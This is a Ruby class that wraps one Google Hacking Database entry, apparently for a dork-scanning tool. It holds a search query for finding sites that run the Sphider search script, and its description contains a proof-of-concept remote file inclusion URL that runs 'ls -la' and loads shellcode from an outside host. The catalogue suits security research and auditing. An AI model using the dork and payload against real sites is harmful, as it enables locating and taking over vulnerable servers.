module Dorks
   class Dork339 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 339",
            ghdb_url: "https://www.exploit-db.com/ghdb/339",
            severity: "5",
            category: "advisories_and_vulnerabilities",
            publish_date: "2006-04-15",
            author: "anonymous",
            dork: <<~EDORK,
"powered by sphider" -exploit -ihackstuff -www.cs.ioc.ee
EDORK
            description: <<~EDESC
dork: "powered by sphider" a vulnerable search engine script arbitrary remote inclusion, poc: http://[target]/[path]/admin/configset.php?cmd=ls%20-la&settings_dir=http://somehost.com where on somehost.com you have a shellcode in /conf.php/index.html references:http://retrogod.altervista.org/sphider_13_xpl_pl.htmlhttp://secunia.com/advisories/19642/
EDESC
         })

      end
   end
end
